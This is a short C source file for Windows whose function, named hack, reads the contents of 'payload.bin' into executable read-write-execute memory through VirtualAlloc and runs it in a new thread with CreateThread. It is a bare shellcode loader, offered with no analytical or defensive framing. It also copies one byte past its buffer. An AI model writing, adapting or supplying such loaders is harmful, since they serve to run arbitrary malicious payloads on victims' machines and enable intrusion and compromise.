#include <stdio.h>
#include <stdlib.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

int hack() {
    FILE *fdShell = fopen("payload.bin", "rb");
    fseek(fdShell, 0, SEEK_END);
    int length = ftell(fdShell);
    rewind(fdShell);

    void *sc = calloc(1, length);
    fread(sc, length, 1, fdShell);

    void* addressPointer = VirtualAlloc(NULL, length+1, 0x3000, 0x40);

    RtlMoveMemory(addressPointer, sc, length+1);

    //void* handle = CreateThread(NULL, 0, (void*)addressPointer, NULL, 0, 0);
    HANDLE handle = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)addressPointer,  // modify to c++
        NULL, 0, NULL);

    Sleep(3000);
    WaitForSingleObject(handle, INFINITE);
    Sleep(10000);
    return 0;
}